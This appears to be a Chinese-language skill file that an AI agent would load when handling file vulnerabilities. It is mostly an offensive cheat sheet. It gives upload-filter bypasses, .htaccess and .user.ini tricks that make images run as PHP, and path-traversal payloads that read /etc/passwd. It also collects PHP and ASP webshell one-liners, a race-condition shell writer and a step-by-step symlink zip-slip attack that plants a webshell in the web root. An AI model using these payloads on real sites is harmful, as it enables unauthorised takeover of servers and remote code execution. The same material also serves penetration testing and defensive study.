---
name: file-vulns
description: Use when encountering file-vulns 攻击技术和利用方法
---

# file vulns

## Info

- **Domain**: web
- **Tags**: web, file-vulns

# 文件漏洞

## 1. 文件上传

### 基础绕过

```
Content-Type: image/jpeg
filename: shell.php
```

### 扩展名绕过

```
shell.php
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
```

### 双扩展名

```
shell.jpg.php
shell.php.jpg
shell.jpg.php.jpg
```

### 00截断

```
shell.php%00.jpg
shell.php .jpg
```

### .htaccess利用

```
AddType application/x-httpd-php .jpg
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini利用

```
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg
```

### 图片马

```bash
copy 1.jpg /b + shell.php /b shell.jpg
```

---

## 2. 文件下载

### 路径遍历

```
/download?file=../../etc/passwd
/download?file=....//....//....//etc/passwd
/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 绕过

```
/download?file=....//....//etc/passwd
/download?file=..%252f..%252f..%252fetc/passwd
```

---

## 3. 竞争条件(Race Condition)

### 多次兑换

```
# 1次兑换请求
POST /redeem
{code: "COUPON123"}

# Burp Intruder快速发送多次
```

### 时间窗口

### 并发操作

---

## 4. Zip Slip

```python
# 构造恶意zip
# ../../etc/passwd
```

---

## 5. MIME类型绕过

```
Content-Type: image/png
-> 改为: image/jpeg, application/octet-stream
```

---

## 6. 客户端校验绕过

```
1. NoScript禁用JavaScript: 阻止客户端校验脚本执行
2. Firebug审查元素: 修改/删除onsubmit验证代码
3. 修改JS校验: 允许.php/.jsp/.asp上传
4. Burp抓包修改: 上传.gif后改扩展名为.php
   注意: 修改Content-Length参数匹配新内容大小
```

---

## 7. 服务端验证绕过

### 黑名单绕过
```
IIS 6.0可解析扩展名: .asa, .cer, .cdx
JSP环境: .jspx, .jspf
ASP环境: .asa, .cer, .cdx
ASP.NET: .ashx, .asmx, .ascx
大小写绕过: .PHP, .Php (Windows/Linux PHP<=5.3.29)
AddType配置: .php5, .phtml, .php4, .php3
解析漏洞: apache2.x中php.xxx会被当作php解析
```

### 双写绕过
```
服务端: str_replace('php', '', $filename)
攻击: backlion.pphphp → 过滤后 → backlion.php
```

### MIME绕过
```
服务端检查Content-Type, 用Burp改为image/jpeg
```

---

## 8. 白名单绕过

```
%00截断: shell.php%00.jpg (PHP<5.3.29, magic_quotes_gpc=off)
文件头检测: GIF89a<?php phpinfo(); ?>
十六进制文件头:
  PNG: 89504E47
  JPG: FFD8FF
图片马: copy tupian.jpg /b + muma.php /a muma.jpg
```

---

## 9. 条件竞争上传

```php
// 上传后短暂存在的文件
<?php fputs(fopen("shell.php","w"),'<?php @eval($_POST["shell"]);?>');?>
```
多线程并发访问上传文件, 在删除前成功执行即可写入webshell

---

## 10. .htaccess详细利用

```apache
# 方法1: AddType - 指定扩展名解析为PHP
AddType application/x-httpd-php .png .jpg .gif

# 方法2: SetHandler - 所有文件作为PHP执行
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>

# 方法3: auto_prepend_file
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=base64yjh.png"

# 方法4: 允许CGI执行
Options +ExecCGI
AddHandler cgi-script .php

# 方法5: URL重写
RewriteEngine On
RewriteRule ^hidden/(.*)$ /uploads/$1 [L]

# 方法6: 禁止PHP执行(防御用)
<Files "*.php">
  Deny from all
</Files>

# 方法7: 禁止目录列表
Options -Indexes
```

---

## 11. .user.ini利用

```ini
# 位于Web根目录, 覆盖php.ini配置
auto_prepend_file=shell.jpg   # 自动包含文件到所有PHP脚本前
auto_append_file=shell.jpg    # 自动包含文件到所有PHP脚本后
```
同一目录下所有PHP文件都会包含shell.jpg中的一句话木马

---

## 12. Webshell汇总

```php
<?php @eval($_POST['value']); ?>       # eval一句话
<?php assert($_POST['value']); ?>      # assert一句话 (PHP<=7)
<?php @preg_replace("/[email]/e", $_POST['h'], "error"); ?>  # preg_replace e修饰符
<?=eval(next(getallheaders()))?>       # 请求头执行
<?=eval($_COOKIE[1]);?>               # Cookie执行
<?=$_POST['a']($_POST['b']);?>        # 双参数动态调用
GIF89a<script language="php">eval($_POST[1])</script>  # 图片马+短标签
```

### ASP Webshell
```asp
<% eval request("value") %>            # ASP一句话
<% execute(request("value")) %>        # ASP execute一句话
```

### 短标签绕过
```php
<? phpinfo(); ?>  # 需要php.ini中short_open_tag=On
```

---

## 13. Content-Type参考

```
文本: text/plain, text/html, text/css, text/javascript, text/xml
图片: image/gif, image/png, image/jpeg
视频: video/webm, video/ogg
音频: audio/midi, audio/mpeg, audio/webm, audio/ogg, audio/wav
二进制: application/octet-stream, application/pdf, application/json
上传表单: multipart/form-data
```

## 14. 软链接文件上传利用（Zip Slip 变种）

### 适用场景
ZIP 文件解压到 `/tmp` 等不可访问目录，需将文件"穿越"到 Web 目录。

### 攻击步骤

**第一步**: 创建指向 Web 目录的软链接并打包
```bash
# 创建软链接
ln -s /var/www/html link
# 打包（-y 保留软链接本身而非内容）
zip -y 1.zip link
```

**第二步**: 创建包含 WebShell 的同名目录并打包
```bash
rm -f link                # 删除软链接
mkdir link                # 创建同名普通目录
echo '<?php @eval($_POST["cmd"]);?>' > link/shell.php
zip -r 2.zip link
```

**第三步**: 按顺序上传
1. 先上传 `1.zip` → 解压得到指向 `/var/www/html` 的软链接 `link`
2. 再上传 `2.zip` → 解压时将 `shell.php` 写入软链接指向的实际位置 `/var/www/html/shell.php`

**第四步**: 访问 `http://目标/shell.php`

### 关键点
- `zip -y` 保存软链接本身，不是它指向的内容
- 第二次解压时 `-o` 覆盖选项会将文件写入软链接目标

---

## 15. 文件读取 Trick

### /proc/self/fd 读取

当文件名长度超过限制时，可从内存中读取：

```bash
ls /proc/self/fd/    # 列出文件描述符
cat /proc/self/fd/3  # 尝试读取
cat /dev/fd/3        # 更短的路径
```